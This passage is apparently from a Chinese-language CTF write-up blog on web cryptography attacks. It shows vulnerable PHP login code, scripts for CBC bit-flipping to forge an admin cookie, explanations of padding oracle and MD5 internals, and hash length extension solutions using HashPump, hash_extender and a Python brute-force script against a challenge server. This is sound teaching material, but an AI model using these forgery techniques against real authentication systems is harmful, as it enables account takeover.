class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">$(document).ready(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $(<span class="string">".username"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">".username"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">".password"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        $(<span class="string">".password"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                $(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>解题<br>得cipher</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#计算cipher</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    明文1：a:2:&#123;s:8:"userna        //r</span></span><br><span class="line"><span class="comment">    明文2：me";s:5:"admiy";        //l字母在第14个字节</span></span><br><span class="line"><span class="comment">    明文3：s:8:"password";s</span></span><br><span class="line"><span class="comment">    明文4：:6:"passwd";&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $cipher = base64_decode(urldecode(<span class="string">'6HJUuK%2BgTYFjGKKdQKrvqG4lQyZNT3A7kl42ipzlqI7M%2BoSGPbRgihwSFPqmfVY2ScFMSuJpCsOgRbTp%2Bpn94Q%3D%3D'</span>));</span><br><span class="line">    $temp = $cipher;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    设密文1[13]=A, 解密(密文2)[13]=B,  明文2[13]=C,  </span></span><br><span class="line"><span class="comment">    将A修改为A ^ C,则:</span></span><br><span class="line"><span class="comment">    A ^ B = A ^ C ^ B = B ^ B = 0 = C</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//                      A                 C          X</span></span><br><span class="line">    $cipher[<span class="number">13</span>] = chr(ord($cipher[<span class="number">13</span>]) ^ ord(<span class="string">'y'</span>) ^ ord(<span class="string">'n'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(base64_encode($cipher));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/2.jpg" alt=""><br>得iv</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#计算iv</span></span><br><span class="line">$res = base64_decode(<span class="string">'RWn5qVqquwKuATc4kqaobG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6InBhc3N3ZCI7fQ=='</span>);<span class="comment">//这里放burp放回的base64数据</span></span><br><span class="line">$iv = base64_decode(urldecode(<span class="string">'Yfz1VNAk9RvNa09MCezJRA%3D%3D'</span>)); <span class="comment">//这里放cookie中的iv</span></span><br><span class="line">$plaintext = <span class="string">'a:2:&#123;s:8:"userna'</span>;</span><br><span class="line">$new_iv = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i ++)&#123;</span><br><span class="line">$new_iv = $new_iv . chr(ord($iv[$i]) ^ ord($res[$i]) ^ ord($plaintext[$i]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode($new_iv));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/3.jpg" alt=""></p><h2 id="Padding-oracle"><a href="#Padding-oracle" class="headerlink" title="Padding oracle"></a>Padding oracle</h2><p>分组密码Block Cipher需要在加载前确保每个每组的长度都是分组长度的整数倍。一般情况下，明文的最后一个分组很有可能会出现长度不足分组的长度:<br><img src="../../images/cipher/web/5.jpg" alt=""><br>这个时候，普遍的做法是PKCS#5标准中定义的规则，在最后一个分组后填充一个固定的值，这个值的大小为填充的字节总数。即假如最后还差3个字符，则填充3个0×03<br><img src="../../images/cipher/web/4.jpg" alt=""><br>因为填充发生在最后一个分组，所以我们主要关注最后一个分组<br><img src="../../images/cipher/web/6.jpg" alt=""><br>这里有个条件是服务器会对我们显示padding error的异常，如果不回显那么肯定无法判断进行利用</p><p>比如在web应用中，如果Padding不正确，则应用程序很可能会返回500的错误(程序执行错误)；如果Padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误(这只是业务上的规定)，所以，这种区别就可以成为一个二值逻辑的”注入点”。</p><p>攻击成立的两个重要假设前提:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击者能够获得密文（Ciphertext），以及附带在密文前面的IV（初始化向量）</span><br><span class="line">2. 攻击者能够触发密文的解密过程，且能够知道密文的解密结果</span><br></pre></td></tr></table></figure><h1 id="HASH"><a href="#HASH" class="headerlink" title="HASH"></a>HASH</h1><p><strong>HASH原理</strong><br><img src="../../images/cipher/web/7.jpg" alt=""><br>首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p><p>补位完成后，字符串以64位一组进行分组。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。</p><p>为确保同一个字符串的hash值唯一，所以需要保证第一次registers的值也唯一。所以在hash算法中，registers具有初始值。如上图中的registers值0。</p><p><strong>MD5算法实现</strong><br>我们要实现对于字符串abc的 md5 的值计算。首先我们要把其转化为 16 进制。<br><img src="../../images/cipher/web/8.jpg" alt=""></p><p>补位<br>（1byte=8bit）消息必须进行补位，即使得其长度在对 512 取模后的值为 448。也就是说，len(message) % 512 == 448。当消息长度不满 448 bit 时（注意是位，而不是字符串长度），消息长度达到 448 bit 即可。当然，如果消息长度已经达到 448 bit，也要进行补位。补位是必须的。<br>补位的方式的二进制表示是在消息的后面加上一个1，后面跟着无限个0，直到 len(message) % 512 == 448。在 16 进制下，我们需要在消息后补80，就是 2 进制的10000000。我们把消息abc进行补位到 448 bit，也就是 56 byte。<br><img src="../../images/cipher/web/9.jpg" alt=""><br>补位过后，第 57 个字节储存的是补位之前的消息长度。abc是 3 个字母，也就是 3 个字节，24 bit。换算成 16 进制为 0x18。其后跟着 7 个字节的 0x00，把消息补满 64 字节。<br>MD5中存储的都是小端方式！<br>重要的事情说三遍，举个例子：假如我们这一块值为0x12345678<br>那么在MD5运算时候存储的顺序是 0x78563412<br>这也是之所以后8字节为长度，而第1字节先有数据的原因<br><img src="../../images/cipher/web/10.jpg" alt=""></p><p>计算消息摘要<br>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>上面的链变量将会被新的值覆盖。之后有四个非线性函数，将字符串和那四个链接变量经过一系列的复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，也就是只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，就需要计算多次，先计算出前512位的ABCD值然后用再用这个ABCD去计算后面512位的ABCD值以此类推，最后计算出来的ABCD经过拼接就是这串字符串的MD5值。</p><p><strong>哈希长度扩展攻击</strong>  </p><p>Hash-Length-Extension-Attack ，可以在知道MD5(message)的hash值得情况下，算出MD5(message+padding+a)的hash值，就是根据短的消息的hash算出更长的消息的hash。 </p><p>所需条件： </p><ul><li>知道Salt的长度</li><li>要知道一个由salt加密后的md5值</li><li>知道$data的值(未加盐的明文)</li></ul><p><strong>例题1：</strong><br>ISCC2018 的一道题目<br>secret.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key=<span class="string">'123456789qwertyuiopasdfghjklzxcvbnm12345671475'</span>;</span><br><span class="line">$flag=<span class="string">'flag&#123;this_1s_a_f1ag&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>hash.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $key;</span><br><span class="line">    <span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>解题<br>从源码可以得到以下内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enc(&quot;guest&quot;)的值  </span><br><span class="line">$key的长度为46</span><br></pre></td></tr></table></figure><p>这段代码要求我们输入的username在经过enc函数加密之后，与<code>$_COOKIE[‘verify’]</code>的值相等，并且username中必须含有admin</p><p>使用hashdump工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line"><span class="built_in">cd</span> HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 已知的<span class="built_in">hash</span>值，这里是<span class="variable">$_COOKIE</span>[<span class="string">'verify'</span>]的值</span><br><span class="line">Input Data: 上面的<span class="built_in">hash</span>值解密后的字符串，这里是guest。</span><br><span class="line">Input Key Length: <span class="variable">$key</span>的长度</span><br><span class="line">Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。</span><br></pre></td></tr></table></figure><p><img src="../../images/cipher/web/11.jpg" alt=""><br>然后我们将得到的hash值去替换数据包中<code>$_COOKIE[‘verify’]</code>的值，然后post提交<code>username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</code>即可。<br><img src="../../images/cipher/web/12.jpg" alt=""></p><p><strong>例题2：</strong><br>jarvis oj 的web题  flag在管理员手中吗?<br>index.php~泄露得源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $auth = <span class="keyword">false</span>;</span><br><span class="line">        $role = <span class="string">"guest"</span>;</span><br><span class="line">        $salt =</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">            $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">            $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">            <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">                $auth = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $s = serialize($role);</span><br><span class="line">            setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">            $hsh = md5($salt.strrev($s));</span><br><span class="line">            setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br></pre></td></tr></table></figure><p>安装hash_extender步骤:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/hash_extender </span><br><span class="line"><span class="built_in">cd</span> hash_extender </span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>然后python脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> httplib <span class="keyword">import</span> HTTPConnection</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gao</span><span class="params">(x, y)</span>:</span></span><br><span class="line">        <span class="comment">#print x</span></span><br><span class="line">        <span class="comment">#print y</span></span><br><span class="line">    url = <span class="string">"http://web.jarvisoj.com:32778/index.php"</span></span><br><span class="line">    cookie = <span class="string">"role="</span> + x + <span class="string">"; hsh="</span> + y</span><br><span class="line">        <span class="comment">#print cookie</span></span><br><span class="line">    build_header = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,</span><br><span class="line">            <span class="string">'Host'</span>: <span class="string">'web.jarvisoj.com:32778'</span>,</span><br><span class="line">            <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="keyword">or</span> <span class="number">80</span>)</span><br><span class="line">    conn.request(<span class="string">"GET"</span>, urlparts.path, <span class="string">''</span>, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    <span class="comment"># secret len = ???</span></span><br><span class="line">    find_hash = <span class="string">"./hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="string">" --quiet"</span></span><br><span class="line">    <span class="comment">#print find_hash</span></span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[<span class="number">0</span>][:<span class="number">32</span>]</span><br><span class="line">    attack_padding = calc_res[<span class="number">0</span>][<span class="number">32</span>:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::<span class="number">-1</span>])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="keyword">print</span> ret</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>注意这个脚本在hash_extender目录下使用</p><p>然后得到回显:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style <span class="built_in">type</span>=<span class="string">"text/css"</span>&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;h3&gt;Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; &lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>参考文章：<br>常见的Web密码学攻击方式汇总：<a href="https://www.anquanke.com/post/id/84724" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84724</a><br>Padding Oracle 和 CBC字节翻转攻击学习：<a href="https://www.cnblogs.com/tr1ple/p/11114958.html" target="_blank" 